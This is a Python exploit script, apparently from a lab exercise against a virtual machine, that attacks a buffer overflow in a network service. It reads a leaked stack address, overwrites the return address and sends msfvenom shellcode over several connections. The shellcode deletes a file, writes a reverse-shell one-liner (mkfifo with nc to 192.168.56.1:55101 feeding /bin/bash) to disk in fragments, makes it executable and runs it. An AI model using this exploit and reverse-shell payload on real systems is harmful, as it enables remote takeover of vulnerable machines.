import socket
import sys
import itertools
import time

# Converts return address to byte string
# Inspired from: http://pymotw.com/2/socket/tcp.html
def exploit(tot_len, offset, payload):
    # Constants
    repl_string = "Hello, dear "
    nop_instr = b'\x90'

    # Create a TCP/IP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Bind the socket to the port
    server_address = ('192.168.56.103', 4321)
    sock.connect(server_address)

    # Sends data
    try:
        data = sock.recv(1024)

        hex_addr = data.decode('ASCII').split('\n', 1)[0].split(' ')[1]
        return_addr = (int(hex_addr, 16) + len(repl_string) + offset).to_bytes(8,'little')

        message = b""
        message += payload
        message += nop_instr * (tot_len - len(payload) - len(repl_string))
        message += return_addr
        message += b'\n'

        sock.sendall(message)
        data = sock.recv(1024)
    except:
        pass
    finally:
        sock.close()


# Exploit parameters
# For it to work on the VM this has to be 152
tot_len=int(sys.argv[1])
offset=0

# Payload definition
payload = b'mkfifo /tmp/dkkr; nc 192.168.56.1 55101 0</tmp/dkkr | /bin/bash >/tmp/dkkr 2>&1; rm /tmp/dkkr'

# All payloads were generated using 'msfvenom'
# Cleans payload file
print("Clearing previous payload script.")
buf =  b""
buf += b"\x48\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x99\xeb"
buf += b"\x1e\x5d\x52\x5b\xb3\x08\x88\x14\x2b\x52\x66\x68"
buf += b"\x2d\x63\x54\x5e\x52\x50\x54\x5f\x52\x55\x56\x57"
buf += b"\x54\x5e\x6a\x3b\x58\x0f\x05\xe8\xdd\xff\xff\xff"
buf += b"\x72\x6d\x20\x2d\x72\x66\x20\x65"

exploit(tot_len=tot_len, offset=offset, payload=buf)

# Pushes full payload to server
print("Uploading new script.")
buf =  b""
buf += b"\x48\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x99\xeb"
buf += b"\x1e\x5d\x52\x5b\xb3\x12\x88\x14\x2b\x52\x66\x68"
buf += b"\x2d\x63\x54\x5e\x52\x50\x54\x5f\x52\x55\x56\x57"
buf += b"\x54\x5e\x6a\x3b\x58\x0f\x05\xe8\xdd\xff\xff\xff"
buf += b"\x65\x63\x68\x6f\x20\x2d\x6e\x20\x4d\x41\x52\x4b"
buf += b"\x53\x20\x3e\x3e\x20\x65"

marker = b'MARKS'
marker_len = len(marker)
marker_pos = buf.find(marker)

payload_fragments = [payload[i:i+marker_len-2] for i in range(0, len(payload), marker_len - 2)]

for fragment in payload_fragments:
    fragment = b'"' + fragment + b'"'
    fragment += b' ' * (marker_len - len(fragment))

    buf_frag = buf[:marker_pos:] + fragment + buf[marker_pos+marker_len::]
    exploit(tot_len=tot_len, offset=offset, payload=buf_frag)


# Makes file executable
print("Making script executable.")
buf =  b""
buf += b"\x48\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x99\xeb"
buf += b"\x1e\x5d\x52\x5b\xb3\x0b\x88\x14\x2b\x52\x66\x68"
buf += b"\x2d\x63\x54\x5e\x52\x50\x54\x5f\x52\x55\x56\x57"
buf += b"\x54\x5e\x6a\x3b\x58\x0f\x05\xe8\xdd\xff\xff\xff"
buf += b"\x63\x68\x6d\x6f\x64\x20\x61\x2b\x78\x20\x65"

exploit(tot_len=tot_len, offset=offset, payload=buf)

# Runs commad
print("Running...")
buf =  b""
buf += b"\x48\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x99\xeb"
buf += b"\x1e\x5d\x52\x5b\xb3\x03\x88\x14\x2b\x52\x66\x68"
buf += b"\x2d\x63\x54\x5e\x52\x50\x54\x5f\x52\x55\x56\x57"
buf += b"\x54\x5e\x6a\x3b\x58\x0f\x05\xe8\xdd\xff\xff\xff"
buf += b"\x2e\x2f\x65"

exploit(tot_len=tot_len, offset=offset, payload=buf)